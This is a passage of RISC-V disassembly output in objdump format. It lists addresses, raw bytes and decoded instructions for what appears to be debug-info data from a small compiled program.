    1dfe:	7562                	ld	a0,56(sp)
    1e00:	0066                	c.slli	zero,0x19
    1e02:	8102                	jr	sp
    1e04:	2e18                	fld	fa4,24(a2)
    1e06:	0011                	c.nop	4
    1e08:	4000                	lw	s0,0(s0)
    1e0a:	0007373b          	0x7373b
    1e0e:	0200                	addi	s0,sp,256
    1e10:	1782                	slli	a5,a5,0x20
    1e12:	0049                	c.nop	18
    1e14:	0000                	unimp
    1e16:	0a00                	addi	s0,sp,272
    1e18:	061a                	slli	a2,a2,0x6
    1e1a:	0000                	unimp
    1e1c:	113e                	slli	sp,sp,0x2f
    1e1e:	0000                	unimp
    1e20:	0000790b          	0x790b
    1e24:	3f00                	fld	fs0,56(a4)
    1e26:	3900                	fld	fs0,48(a0)
    1e28:	0780                	addi	s0,sp,960
    1e2a:	0000                	unimp
    1e2c:	6b02                	ld	s6,0(sp)
    1e2e:	0006                	c.slli	zero,0x1
    1e30:	0080001b          	addiw	zero,zero,8
    1e34:	0000                	unimp
    1e36:	e600                	sd	s0,8(a2)
    1e38:	0000                	unimp
    1e3a:	0000                	unimp
    1e3c:	0000                	unimp
    1e3e:	0100                	addi	s0,sp,128
    1e40:	c99c                	sw	a5,16(a1)
    1e42:	0011                	c.nop	4
    1e44:	3300                	fld	fs0,32(a4)
    1e46:	00646963          	bltu	s0,t1,1e58 <_tbss_end+0x1dd4>
    1e4a:	6b02                	ld	s6,0(sp)
    1e4c:	4910                	lw	a2,16(a0)
    1e4e:	0000                	unimp
    1e50:	0300                	addi	s0,sp,384
    1e52:	dc91                	beqz	s1,1d6e <_tbss_end+0x1cea>
    1e54:	337e                	fld	ft6,504(sp)
    1e56:	636e                	ld	t1,216(sp)
    1e58:	0200                	addi	s0,sp,256
    1e5a:	0049196b          	0x49196b
    1e5e:	0000                	unimp
    1e60:	7ed89103          	lh	sp,2029(a7)
    1e64:	7234                	ld	a3,96(a2)
    1e66:	7465                	lui	s0,0xffff9
    1e68:	0200                	addi	s0,sp,256
    1e6a:	0771                	addi	a4,a4,28
    1e6c:	0049                	c.nop	18
    1e6e:	0000                	unimp
    1e70:	9102                	jalr	sp
    1e72:	3c50                	fld	fa2,184(s0)
    1e74:	7562                	ld	a0,56(sp)
    1e76:	0066                	c.slli	zero,0x19
    1e78:	7302                	ld	t1,32(sp)
    1e7a:	2e08                	fld	fa0,24(a2)
    1e7c:	0011                	c.nop	4
    1e7e:	4000                	lw	s0,0(s0)
    1e80:	7902                	ld	s2,32(sp)
    1e82:	2400                	fld	fs0,8(s0)
    1e84:	08d9                	addi	a7,a7,22
    1e86:	0000                	unimp
    1e88:	7402                	ld	s0,32(sp)
    1e8a:	1409                	addi	s0,s0,-30
    1e8c:	0006                	c.slli	zero,0x1
    1e8e:	0200                	addi	s0,sp,256
    1e90:	5891                	li	a7,-28
    1e92:	582c                	lw	a1,112(s0)
    1e94:	0080001b          	addiw	zero,zero,8
    1e98:	0000                	unimp
    1e9a:	7600                	ld	s0,40(a2)
    1e9c:	0000                	unimp
    1e9e:	0000                	unimp
    1ea0:	0000                	unimp
    1ea2:	3400                	fld	fs0,40(s0)
    1ea4:	0069                	c.nop	26
    1ea6:	7502                	ld	a0,32(sp)
    1ea8:	490c                	lw	a1,16(a0)
    1eaa:	0000                	unimp
    1eac:	0200                	addi	s0,sp,256
    1eae:	5491                	li	s1,-28
    1eb0:	0000                	unimp
    1eb2:	243d                	addiw	s0,s0,15
    1eb4:	0009                	c.nop	2
    1eb6:	0200                	addi	s0,sp,256
    1eb8:	0d60                	addi	s0,sp,668
    1eba:	1aa6                	slli	s5,s5,0x29
    1ebc:	8000                	0x8000
    1ebe:	0000                	unimp
    1ec0:	0000                	unimp
    1ec2:	005a                	c.slli	zero,0x16
    1ec4:	0000                	unimp
    1ec6:	0000                	unimp
    1ec8:	0000                	unimp
    1eca:	9c01                	subw	s0,s0,s0
    1ecc:	1244                	addi	s1,sp,292
    1ece:	0000                	unimp
    1ed0:	0324                	addi	s1,sp,392
    1ed2:	0008                	0x8
    1ed4:	0200                	addi	s0,sp,256
    1ed6:	1262                	slli	tp,tp,0x38
    1ed8:	0000015b          	0x15b
    1edc:	5401                	li	s0,-32
    1ede:	00061723          	sh	zero,14(a2) # 300e <_tbss_end+0x2f8a>
    1ee2:	0200                	addi	s0,sp,256
    1ee4:	061a0f63          	beq	s4,ra,1f62 <_tbss_end+0x1ede>
    1ee8:	0000                	unimp
    1eea:	0007d123          	0x7d123
    1eee:	0200                	addi	s0,sp,256
    1ef0:	1864                	addi	s1,sp,60
    1ef2:	061a                	slli	a2,a2,0x6
    1ef4:	0000                	unimp
    1ef6:	00065e23          	0x65e23
    1efa:	0200                	addi	s0,sp,256
    1efc:	2664                	fld	fs1,200(a2)
    1efe:	061a                	slli	a2,a2,0x6
    1f00:	0000                	unimp
    1f02:	00082523          	sw	zero,10(a6)
    1f06:	0200                	addi	s0,sp,256
    1f08:	3264                	fld	fs1,224(a2)
    1f0a:	061a                	slli	a2,a2,0x6
    1f0c:	0000                	unimp
    1f0e:	5324                	lw	s1,96(a4)
    1f10:	0006                	c.slli	zero,0x1
    1f12:	0200                	addi	s0,sp,256
    1f14:	0a65                	addi	s4,s4,25
    1f16:	00ae                	slli	ra,ra,0xb
    1f18:	0000                	unimp
    1f1a:	9102                	jalr	sp
    1f1c:	2468                	fld	fa0,200(s0)
    1f1e:	07f9                	addi	a5,a5,30
    1f20:	0000                	unimp
    1f22:	6702                	ld	a4,0(sp)
    1f24:	ae0a                	fsd	ft2,280(sp)
    1f26:	0000                	unimp
    1f28:	0200                	addi	s0,sp,256
    1f2a:	6091                	lui	ra,0x4
    1f2c:	2e00                	fld	fs0,24(a2)
    1f2e:	000005af          	0x5af
    1f32:	5902                	lw	s2,32(sp)
    1f34:	0000491b          	0x491b
    1f38:	7c00                	ld	s0,56(s0)
    1f3a:	001a                	c.slli	zero,0x6
    1f3c:	0080                	addi	s0,sp,64
    1f3e:	0000                	unimp
    1f40:	2a00                	fld	fs0,16(a2)
    1f42:	0000                	unimp
    1f44:	0000                	unimp
    1f46:	0000                	unimp
    1f48:	0100                	addi	s0,sp,128
    1f4a:	859c                	0x859c
    1f4c:	0012                	c.slli	zero,0x4
    1f4e:	3200                	fld	fs0,32(a2)
    1f50:	07b9                	addi	a5,a5,14
    1f52:	0000                	unimp
    1f54:	5902                	lw	s2,32(sp)
    1f56:	4924                	lw	s1,80(a0)
    1f58:	0000                	unimp
    1f5a:	0200                	addi	s0,sp,256
    1f5c:	6c91                	lui	s9,0x4
    1f5e:	c432                	sw	a2,8(sp)
    1f60:	02000007          	0x2000007
    1f64:	3159                	addiw	sp,sp,-10
    1f66:	00000db7          	lui	s11,0x0
    1f6a:	9102                	jalr	sp
    1f6c:	0060                	addi	s0,sp,12
    1f6e:	9b3e                	add	s6,s6,a5
    1f70:	0006                	c.slli	zero,0x1
    1f72:	0200                	addi	s0,sp,256
    1f74:	1c52                	slli	s8,s8,0x34
    1f76:	1a56                	slli	s4,s4,0x35
    1f78:	8000                	0x8000
    1f7a:	0000                	unimp
    1f7c:	0000                	unimp
    1f7e:	0026                	c.slli	zero,0x9
    1f80:	0000                	unimp
    1f82:	0000                	unimp
    1f84:	0000                	unimp
    1f86:	9c01                	subw	s0,s0,s0
    1f88:	12c1                	addi	t0,t0,-16
    1f8a:	0000                	unimp
    1f8c:	64696333          	0x64696333
    1f90:	0200                	addi	s0,sp,256
    1f92:	2d52                	fld	fs10,272(sp)
    1f94:	0049                	c.nop	18
    1f96:	0000                	unimp
    1f98:	9102                	jalr	sp
    1f9a:	336c                	fld	fa1,224(a4)
    1f9c:	636e                	ld	t1,216(sp)
    1f9e:	0200                	addi	s0,sp,256
    1fa0:	3652                	fld	fa2,304(sp)
    1fa2:	0049                	c.nop	18
    1fa4:	0000                	unimp
    1fa6:	9102                	jalr	sp
    1fa8:	0068                	addi	a0,sp,12
    1faa:	7e39                	lui	t3,0xfffee
    1fac:	0006                	c.slli	zero,0x1
    1fae:	0200                	addi	s0,sp,256
    1fb0:	064d                	addi	a2,a2,19
    1fb2:	1a20                	addi	s0,sp,312
    1fb4:	8000                	0x8000
    1fb6:	0000                	unimp
    1fb8:	0000                	unimp
    1fba:	0036                	c.slli	zero,0xd
    1fbc:	0000                	unimp
    1fbe:	0000                	unimp
    1fc0:	0000                	unimp
    1fc2:	9c01                	subw	s0,s0,s0
    1fc4:	12ed                	addi	t0,t0,-5
    1fc6:	0000                	unimp
    1fc8:	02007333          	remu	t1,zero,zero
    1fcc:	1b4d                	addi	s6,s6,-13
    1fce:	064a                	slli	a2,a2,0x12
    1fd0:	0000                	unimp
    1fd2:	9102                	jalr	sp
    1fd4:	0058                	addi	a4,sp,4
    1fd6:	0006bf3f 06480200 	0x64802000006bf3f
    1fde:	1a10                	addi	a2,sp,304
    1fe0:	8000                	0x8000
    1fe2:	0000                	unimp
    1fe4:	0000                	unimp
    1fe6:	0010                	0x10
    1fe8:	0000                	unimp
    1fea:	0000                	unimp
    1fec:	0000                	unimp
    1fee:	9c01                	subw	s0,s0,s0
    1ff0:	ef40                	sd	s0,152(a4)
    1ff2:	0008                	0x8
    1ff4:	0200                	addi	s0,sp,256
    1ff6:	19f80643          	fmadd.s	fa2,fa6,ft11,ft3,rne
    1ffa:	8000                	0x8000
    1ffc:	0000                	unimp
    1ffe:	0000                	unimp
    2000:	0018                	0x18
    2002:	0000                	unimp
    2004:	0000                	unimp
    2006:	0000                	unimp
    2008:	9c01                	subw	s0,s0,s0
    200a:	1335                	addi	t1,t1,-19
    200c:	0000                	unimp
    200e:	fc32                	sd	a2,56(sp)
    2010:	0006                	c.slli	zero,0x1
    2012:	0200                	addi	s0,sp,256
    2014:	00490f43          	fmadd.s	ft10,fs2,ft4,ft0,rne
    2018:	0000                	unimp
    201a:	9102                	jalr	sp
    201c:	006c                	addi	a1,sp,12
    201e:	8f2e                	mv	t5,a1
    2020:	0006                	c.slli	zero,0x1
    2022:	0200                	addi	s0,sp,256
    2024:	213e                	fld	ft2,456(sp)
    2026:	009d                	addi	ra,ra,7
    2028:	0000                	unimp
    202a:	19dc                	addi	a5,sp,244
    202c:	8000                	0x8000
    202e:	0000                	unimp
    2030:	0000                	unimp
    2032:	001c                	0x1c
    2034:	0000                	unimp
    2036:	0000                	unimp
    2038:	0000                	unimp
    203a:	9c01                	subw	s0,s0,s0
    203c:	1385                	addi	t2,t2,-31
    203e:	0000                	unimp
    2040:	3332                	fld	ft6,296(sp)
    2042:	0006                	c.slli	zero,0x1
    2044:	0200                	addi	s0,sp,256
    2046:	373e                	fld	fa4,488(sp)
    2048:	009d                	addi	ra,ra,7
    204a:	0000                	unimp
    204c:	9102                	jalr	sp
    204e:	3368                	fld	fa0,224(a4)
    2050:	7065                	c.lui	zero,0xffff9
    2052:	3e020063          	beqz	tp,2432 <_tbss_end+0x23ae>
    2056:	9d48                	0x9d48
    2058:	0000                	unimp
    205a:	0200                	addi	s0,sp,256
    205c:	6091                	lui	ra,0x4
    205e:	7932                	ld	s2,296(sp)
    2060:	0006                	c.slli	zero,0x1
    2062:	0200                	addi	s0,sp,256
    2064:	573e                	lw	a4,236(sp)
    2066:	0c30                	addi	a2,sp,536
    2068:	0000                	unimp
    206a:	9102                	jalr	sp
    206c:	0058                	addi	a4,sp,4
    206e:	e841                	bnez	s0,20fe <_tbss_end+0x207a>
    2070:	0008                	0x8
    2072:	0200                	addi	s0,sp,256
    2074:	2038                	fld	fa4,64(s0)
    2076:	19bc                	addi	a5,sp,248
    2078:	8000                	0x8000
    207a:	0000                	unimp
    207c:	0000                	unimp
    207e:	0020                	addi	s0,sp,8
    2080:	0000                	unimp
    2082:	0000                	unimp
    2084:	0000                	unimp
    2086:	9c01                	subw	s0,s0,s0
    2088:	000013b3          	sll	t2,zero,zero
    208c:	fc32                	sd	a2,56(sp)
    208e:	0006                	c.slli	zero,0x1
    2090:	0200                	addi	s0,sp,256
    2092:	3638                	fld	fa4,104(a2)
    2094:	009d                	addi	ra,ra,7
    2096:	0000                	unimp
    2098:	9102                	jalr	sp
    209a:	0068                	addi	a0,sp,12
    209c:	1b3e                	slli	s6,s6,0x2f
    209e:	0009                	c.nop	2
    20a0:	0200                	addi	s0,sp,256
    20a2:	0628                	addi	a0,sp,776
    20a4:	18ac                	addi	a1,sp,120
    20a6:	8000                	0x8000
    20a8:	0000                	unimp
    20aa:	0000                	unimp
    20ac:	0110                	addi	a2,sp,128
    20ae:	0000                	unimp
    20b0:	0000                	unimp
    20b2:	0000                	unimp
    20b4:	9c01                	subw	s0,s0,s0
    20b6:	00001477          	0x1477
    20ba:	b832                	fsd	fa2,48(sp)
    20bc:	0006                	c.slli	zero,0x1
    20be:	0200                	addi	s0,sp,256
    20c0:	1328                	addi	a0,sp,424
    20c2:	0049                	c.nop	18
    20c4:	0000                	unimp
    20c6:	7fbc9103          	lh	sp,2043(s9) # 47fb <_tbss_end+0x4777>
    20ca:	6934                	ld	a3,80(a0)
    20cc:	0200                	addi	s0,sp,256
    20ce:	072a                	slli	a4,a4,0xa
    20d0:	0049                	c.nop	18
    20d2:	0000                	unimp
    20d4:	9102                	jalr	sp
    20d6:	2b5c                	fld	fa5,144(a4)
    20d8:	18bc                	addi	a5,sp,120
    20da:	8000                	0x8000
    20dc:	0000                	unimp
    20de:	0000                	unimp
    20e0:	007c                	addi	a5,sp,12
    20e2:	0000                	unimp
    20e4:	0000                	unimp
    20e6:	0000                	unimp
    20e8:	1434                	addi	a3,sp,552
    20ea:	0000                	unimp
    20ec:	6334                	ld	a3,64(a4)
    20ee:	02007273          	csrrci	tp,0x20,0
    20f2:	0332                	slli	t1,t1,0xc
    20f4:	009d                	addi	ra,ra,7
    20f6:	0000                	unimp
    20f8:	9102                	jalr	sp
    20fa:	2c68                	fld	fa0,216(s0)
    20fc:	18ca                	slli	a7,a7,0x32
    20fe:	8000                	0x8000
    2100:	0000                	unimp
    2102:	0000                	unimp
    2104:	000c                	0xc
    2106:	0000                	unimp
    2108:	0000                	unimp
    210a:	0000                	unimp
    210c:	a124                	fsd	fs1,64(a0)
    210e:	0001                	nop
    2110:	0200                	addi	s0,sp,256
    2112:	0332                	slli	t1,t1,0xc
    2114:	0079                	c.nop	30
    2116:	0000                	unimp
    2118:	9102                	jalr	sp
    211a:	0050                	addi	a2,sp,4
    211c:	2c00                	fld	fs0,24(s0)
    211e:	1938                	addi	a4,sp,184
    2120:	8000                	0x8000
    2122:	0000                	unimp
    2124:	0000                	unimp
    2126:	007c                	addi	a5,sp,12
    2128:	0000                	unimp
    212a:	0000                	unimp
    212c:	0000                	unimp
    212e:	6334                	ld	a3,64(a4)
    2130:	02007273          	csrrci	tp,0x20,0
    2134:	009d0333          	add	t1,s10,s1
    2138:	0000                	unimp
    213a:	9102                	jalr	sp
    213c:	2c60                	fld	fs0,216(s0)
    213e:	1946                	slli	s2,s2,0x31
    2140:	8000                	0x8000
    2142:	0000                	unimp
    2144:	0000                	unimp
    2146:	000c                	0xc
    2148:	0000                	unimp
    214a:	0000                	unimp
    214c:	0000                	unimp
    214e:	a124                	fsd	fs1,64(a0)
    2150:	0001                	nop
    2152:	0200                	addi	s0,sp,256
    2154:	00790333          	add	t1,s2,t2
    2158:	0000                	unimp
    215a:	9102                	jalr	sp
    215c:	0048                	addi	a0,sp,4
    215e:	0000                	unimp
    2160:	8638                	0x8638
    2162:	02000007          	0x2000007
    2166:	1212                	slli	tp,tp,0x24
    2168:	009d                	addi	ra,ra,7
    216a:	0000                	unimp
    216c:	182e                	slli	a6,a6,0x2b
    216e:	8000                	0x8000
    2170:	0000                	unimp
    2172:	0000                	unimp
    2174:	007e                	c.slli	zero,0x1f
    2176:	0000                	unimp
    2178:	0000                	unimp
    217a:	0000                	unimp
    217c:	9c01                	subw	s0,s0,s0
    217e:	14ea                	slli	s1,s1,0x3a
    2180:	0000                	unimp
    2182:	be32                	fsd	fa2,312(sp)
    2184:	02000007          	0x2000007
    2188:	2412                	fld	fs0,256(sp)
    218a:	009d                	addi	ra,ra,7
    218c:	0000                	unimp
    218e:	7ef89103          	lh	sp,2031(a7)
    2192:	7132                	ld	sp,296(sp)
    2194:	02000007          	0x2000007
    2198:	3412                	fld	fs0,288(sp)
    219a:	008c                	addi	a1,sp,64
    219c:	0000                	unimp
    219e:	7ef09103          	lh	sp,2031(ra) # 47ef <_tbss_end+0x476b>
    21a2:	7632                	ld	a2,296(sp)
    21a4:	02000007          	0x2000007
    21a8:	4312                	lw	t1,4(sp)
    21aa:	008c                	addi	a1,sp,64
    21ac:	0000                	unimp
    21ae:	7ee89103          	lh	sp,2030(a7)
    21b2:	7b32                	ld	s6,296(sp)
    21b4:	02000007          	0x2000007
    21b8:	5212                	lw	tp,36(sp)
    21ba:	008c                	addi	a1,sp,64
    21bc:	0000                	unimp
    21be:	7ee09103          	lh	sp,2030(ra)
    21c2:	de42                	sw	a6,60(sp)
    21c4:	0008                	0x8
    21c6:	0200                	addi	s0,sp,256
    21c8:	1514                	addi	a3,sp,672
    21ca:	14fa                	slli	s1,s1,0x3e
    21cc:	0000                	unimp
    21ce:	0240                	addi	s0,sp,260
    21d0:	007f                	0x7f
    21d2:	0a00                	addi	s0,sp,272
    21d4:	0098                	addi	a4,sp,64
    21d6:	0000                	unimp
    21d8:	14fa                	slli	s1,s1,0x3e
    21da:	0000                	unimp
    21dc:	0000790b          	0x790b
    21e0:	0700                	addi	s0,sp,896
    21e2:	0400                	addi	s0,sp,512
    21e4:	14ea                	slli	s1,s1,0x3a
    21e6:	0000                	unimp
    21e8:	0138                	addi	a4,sp,136
    21ea:	01000007          	0x1000007
    21ee:	1172                	slli	sp,sp,0x3c
    21f0:	008c                	addi	a1,sp,64
    21f2:	0000                	unimp
    21f4:	17f8                	addi	a4,sp,1004
    21f6:	8000                	0x8000
    21f8:	0000                	unimp
    21fa:	0000                	unimp
    21fc:	0036                	c.slli	zero,0xd
    21fe:	0000                	unimp
    2200:	0000                	unimp
    2202:	0000                	unimp
    2204:	9c01                	subw	s0,s0,s0
    2206:	153e                	slli	a0,a0,0x2f
    2208:	0000                	unimp
    220a:	01007833          	and	a6,zero,a6
    220e:	1f72                	slli	t5,t5,0x3c
    2210:	008c                	addi	a1,sp,64
    2212:	0000                	unimp
    2214:	9102                	jalr	sp
    2216:	3458                	fld	fa4,168(s0)
    2218:	6962                	ld	s2,24(sp)
    221a:	0074                	addi	a3,sp,12
    221c:	7401                	lui	s0,0xfffe0
    221e:	8c0c                	0x8c0c
    2220:	0000                	unimp
    2222:	0200                	addi	s0,sp,256
    2224:	6891                	lui	a7,0x4
    2226:	4300                	lw	s0,0(a4)
    2228:	00000687          	0x687
    222c:	5e01                	li	t3,-32
    222e:	00176e27          	0x176e27
    2232:	0080                	addi	s0,sp,64
    2234:	0000                	unimp
    2236:	8a00                	0x8a00
    2238:	0000                	unimp
    223a:	0000                	unimp
    223c:	0000                	unimp
    223e:	0100                	addi	s0,sp,128
    2240:	a49c                	fsd	fa5,8(s1)
    2242:	0015                	c.nop	5
    2244:	3200                	fld	fs0,32(a2)
    2246:	07de                	slli	a5,a5,0x17
    2248:	0000                	unimp
    224a:	5e01                	li	t3,-32
    224c:	00004933          	xor	s2,zero,zero
    2250:	0200                	addi	s0,sp,256
    2252:	6c91                	lui	s9,0x4
    2254:	ce24                	sw	s1,88(a2)
    2256:	0008                	0x8
    2258:	0100                	addi	s0,sp,128
    225a:	1760                	addi	s0,sp,940
    225c:	0050                	addi	a2,sp,4
    225e:	0000                	unimp
    2260:	0309                	addi	t1,t1,2
    2262:	b264                	fsd	fs1,224(a2)
    2264:	8001                	srli	s0,s0,0x0
    2266:	0000                	unimp
    2268:	0000                	unimp
    226a:	5824                	lw	s1,112(s0)
    226c:	0004                	0x4
    226e:	0100                	addi	s0,sp,128
    2270:	1761                	addi	a4,a4,-8
    2272:	0050                	addi	a2,sp,4
    2274:	0000                	unimp
    2276:	0309                	addi	t1,t1,2
    2278:	b260                	fsd	fs0,224(a2)
    227a:	8001                	srli	s0,s0,0x0
    227c:	0000                	unimp
    227e:	0000                	unimp
    2280:	0008c83b          	0x8c83b
    2284:	0100                	addi	s0,sp,128
    2286:	1762                	slli	a4,a4,0x38
    2288:	0049                	c.nop	18
    228a:	0000                	unimp
    228c:	3800                	fld	fs0,48(s0)
    228e:	078e                	slli	a5,a5,0x3
    2290:	0000                	unimp
    2292:	4e01                	li	t3,0
    2294:	490c                	lw	a1,16(a0)
    2296:	0000                	unimp
    2298:	4c00                	lw	s0,24(s0)
    229a:	0016                	c.slli	zero,0x5
    229c:	0080                	addi	s0,sp,64
    229e:	0000                	unimp
    22a0:	2200                	fld	fs0,0(a2)
    22a2:	0001                	nop
    22a4:	0000                	unimp
    22a6:	0000                	unimp
    22a8:	0100                	addi	s0,sp,128
    22aa:	6a9c                	ld	a5,16(a3)
    22ac:	0016                	c.slli	zero,0x5
    22ae:	3300                	fld	fs0,32(a4)
    22b0:	006e                	c.slli	zero,0x1b
    22b2:	4e01                	li	t3,0
    22b4:	491d                	li	s2,7
    22b6:	0000                	unimp
    22b8:	0300                	addi	s0,sp,384
    22ba:	bc91                	j	1d0e <_tbss_end+0x1c8a>
    22bc:	327f                	0x327f
    22be:	08d4                	addi	a3,sp,84
    22c0:	0000                	unimp
    22c2:	4e01                	li	t3,0
    22c4:	00166a37          	lui	s4,0x166
    22c8:	0300                	addi	s0,sp,384
    22ca:	b091                	j	1b0e <_tbss_end+0x1a8a>
    22cc:	327f                	0x327f
    22ce:	092d                	addi	s2,s2,11
    22d0:	0000                	unimp
    22d2:	4e01                	li	t3,0
    22d4:	0016814b          	fnmsub.s	ft2,fa3,ft1,ft0,rne
    22d8:	0300                	addi	s0,sp,384
    22da:	a891                	j	232e <_tbss_end+0x22aa>
    22dc:	347f                	0x347f
    22de:	0069                	c.nop	26
    22e0:	5001                	c.li	zero,-32
    22e2:	00004907          	flq	fs2,0(zero) # ffffffffffff9000 <_end+0xffffffff7ffddd80>
    22e6:	0200                	addi	s0,sp,256
    22e8:	6c91                	lui	s9,0x4
    22ea:	662c                	ld	a1,72(a2)
    22ec:	0016                	c.slli	zero,0x5
    22ee:	0080                	addi	s0,sp,64
    22f0:	0000                	unimp
    22f2:	9c00                	0x9c00
    22f4:	0000                	unimp
    22f6:	0000                	unimp
    22f8:	0000                	unimp
    22fa:	3400                	fld	fs0,40(s0)
    22fc:	3074                	fld	fa3,224(s0)
    22fe:	0100                	addi	s0,sp,128
    2300:	0c54                	addi	a3,sp,532
    2302:	1670                	addi	a2,sp,812
    2304:	0000                	unimp
    2306:	9102                	jalr	sp
    2308:	3460                	fld	fs0,232(s0)
    230a:	3174                	fld	fa3,224(a0)
    230c:	0100                	addi	s0,sp,128
    230e:	1a54                	addi	a3,sp,308
    2310:	1670                	addi	a2,sp,812
    2312:	0000                	unimp
    2314:	9102                	jalr	sp
    2316:	3458                	fld	fa4,168(s0)
    2318:	3076                	fld	ft0,376(sp)
    231a:	0100                	addi	s0,sp,128
    231c:	0c55                	addi	s8,s8,21
    231e:	1670                	addi	a2,sp,812
    2320:	0000                	unimp
    2322:	9102                	jalr	sp
    2324:	3450                	fld	fa2,168(s0)
    2326:	3176                	fld	ft2,376(sp)
    2328:	0100                	addi	s0,sp,128
    232a:	1c55                	addi	s8,s8,-11
    232c:	1670                	addi	a2,sp,812
    232e:	0000                	unimp
    2330:	9102                	jalr	sp
    2332:	3448                	fld	fa0,168(s0)
    2334:	7165                	addi	sp,sp,-400
    2336:	0031                	c.nop	12
    2338:	5601                	li	a2,-32
    233a:	4909                	li	s2,2
    233c:	0000                	unimp
    233e:	0200                	addi	s0,sp,256
    2340:	4491                	li	s1,4
    2342:	6534                	ld	a3,72(a0)
    2344:	3271                	addiw	tp,tp,-4
    2346:	0100                	addi	s0,sp,128
    2348:	1956                	slli	s2,s2,0x35
    234a:	0049                	c.nop	18
    234c:	0000                	unimp
    234e:	9102                	jalr	sp
    2350:	0040                	addi	s0,sp,4
    2352:	1200                	addi	s0,sp,288
    2354:	7c08                	ld	a0,56(s0)
    2356:	0016                	c.slli	zero,0x5
    2358:	0200                	addi	s0,sp,256
    235a:	0408                	addi	a0,sp,512
    235c:	0000030f          	0x30f
    2360:	7005                	c.lui	zero,0xfffe1
    2362:	0016                	c.slli	zero,0x5
    2364:	0400                	addi	s0,sp,512
    2366:	00001677          	0x1677
    236a:	0812                	slli	a6,a6,0x4
    236c:	00001677          	0x1677
    2370:	2d38                	fld	fa4,88(a0)
    2372:	0009                	c.nop	2
    2374:	0100                	addi	s0,sp,128
    2376:	0c3e                	slli	s8,s8,0xf
    2378:	0049                	c.nop	18
    237a:	0000                	unimp
    237c:	1542                	slli	a0,a0,0x30
    237e:	8000                	0x8000
    2380:	0000                	unimp
    2382:	0000                	unimp
    2384:	010a                	slli	sp,sp,0x2
    2386:	0000                	unimp
    2388:	0000                	unimp
    238a:	0000                	unimp
    238c:	9c01                	subw	s0,s0,s0
    238e:	172d                	addi	a4,a4,-21
    2390:	0000                	unimp
    2392:	01006e33          	or	t3,zero,a6
    2396:	173e                	slli	a4,a4,0x2f
    2398:	0049                	c.nop	18
    239a:	0000                	unimp
    239c:	9102                	jalr	sp
    239e:	324c                	fld	fa1,160(a2)
    23a0:	08d4                	addi	a3,sp,84
    23a2:	0000                	unimp
    23a4:	3e01                	addiw	t3,t3,-32
    23a6:	2d2e                	fld	fs10,200(sp)
    23a8:	02000017          	auipc	zero,0x2000
    23ac:	4091                	li	ra,4
    23ae:	2d32                	fld	fs10,264(sp)
    23b0:	0009                	c.nop	2
    23b2:	0100                	addi	s0,sp,128
    23b4:	3f3e                	fld	ft10,488(sp)
    23b6:	00001733          	sll	a4,zero,zero
    23ba:	7fb89103          	lh	sp,2043(a7) # 47fb <_tbss_end+0x4777>
    23be:	6934                	ld	a3,80(a0)
    23c0:	0100                	addi	s0,sp,128
    23c2:	0740                	addi	s0,sp,900
    23c4:	0049                	c.nop	18
    23c6:	0000                	unimp
    23c8:	9102                	jalr	sp
    23ca:	2c6c                	fld	fa1,216(s0)
    23cc:	155c                	addi	a5,sp,676
    23ce:	8000                	0x8000
    23d0:	0000                	unimp
    23d2:	0000                	unimp
    23d4:	0080                	addi	s0,sp,64
    23d6:	0000                	unimp
    23d8:	0000                	unimp
    23da:	0000                	unimp
    23dc:	7434                	ld	a3,104(s0)
    23de:	0030                	addi	a2,sp,8
    23e0:	4401                	li	s0,0
    23e2:	4909                	li	s2,2
    23e4:	0000                	unimp
    23e6:	0200                	addi	s0,sp,256
    23e8:	6891                	lui	a7,0x4
    23ea:	7434                	ld	a3,104(s0)
    23ec:	0031                	c.nop	12
    23ee:	4401                	li	s0,0
    23f0:	00004917          	auipc	s2,0x4
    23f4:	0200                	addi	s0,sp,256
    23f6:	6491                	lui	s1,0x4
    23f8:	7634                	ld	a3,104(a2)
    23fa:	0030                	addi	a2,sp,8
    23fc:	4501                	li	a0,0
    23fe:	4909                	li	s2,2
    2400:	0000                	unimp
    2402:	0200                	addi	s0,sp,256
    2404:	6091                	lui	ra,0x4
    2406:	7634                	ld	a3,104(a2)
    2408:	0031                	c.nop	12
    240a:	4501                	li	a0,0
    240c:	4919                	li	s2,6
    240e:	0000                	unimp
    2410:	0200                	addi	s0,sp,256
    2412:	5c91                	li	s9,-28
    2414:	0000                	unimp
    2416:	0812                	slli	a6,a6,0x4
    2418:	0055                	c.nop	21
    241a:	0000                	unimp
    241c:	0812                	slli	a6,a6,0x4
    241e:	005a                	c.slli	zero,0x16
    2420:	0000                	unimp
    2422:	00074e43          	fmadd.s	ft8,fa4,ft0,ft0,rmm
    2426:	0100                	addi	s0,sp,128
    2428:	15260d33          	0x15260d33
    242c:	8000                	0x8000
    242e:	0000                	unimp
    2430:	0000                	unimp
    2432:	001c                	0x1c
    2434:	0000                	unimp
    2436:	0000                	unimp
    2438:	0000                	unimp
    243a:	9c01                	subw	s0,s0,s0
    243c:	00001783          	lh	a5,0(zero) # 20023a8 <_tbss_end+0x2002324>
    2440:	1232                	slli	tp,tp,0x2c
    2442:	0006                	c.slli	zero,0x1
    2444:	0100                	addi	s0,sp,128
    2446:	064a2933          	0x64a2933
    244a:	0000                	unimp
    244c:	9102                	jalr	sp
    244e:	3368                	fld	fa0,224(a4)
    2450:	006e                	c.slli	zero,0x1b
    2452:	3301                	addiw	t1,t1,-32
    2454:	4935                	li	s2,13
    2456:	0000                	unimp
    2458:	0200                	addi	s0,sp,256
    245a:	6491                	lui	s1,0x4
    245c:	72726133          	0x72726133
    2460:	0100                	addi	s0,sp,128
    2462:	16814533          	0x16814533
    2466:	0000                	unimp
    2468:	9102                	jalr	sp
    246a:	0058                	addi	a4,sp,4
    246c:	2844                	fld	fs1,144(s0)
    246e:	0006                	c.slli	zero,0x1
    2470:	0100                	addi	s0,sp,128
    2472:	0d28                	addi	a0,sp,664
    2474:	150a                	slli	a0,a0,0x22
    2476:	8000                	0x8000
    2478:	0000                	unimp
    247a:	0000                	unimp
    247c:	001c                	0x1c
    247e:	0000                	unimp
    2480:	0000                	unimp
    2482:	0000                	unimp
    2484:	9c01                	subw	s0,s0,s0
    2486:	1232                	slli	tp,tp,0x2c
    2488:	0006                	c.slli	zero,0x1
    248a:	0100                	addi	s0,sp,128
    248c:	2328                	fld	fa0,64(a4)
    248e:	064a                	slli	a2,a2,0x12
    2490:	0000                	unimp
    2492:	9102                	jalr	sp
    2494:	3368                	fld	fa0,224(a4)
    2496:	006e                	c.slli	zero,0x1b
    2498:	2801                	sext.w	a6,a6
    249a:	0000492f          	0x492f
    249e:	0200                	addi	s0,sp,256
    24a0:	6491                	lui	s1,0x4
    24a2:	72726133          	0x72726133
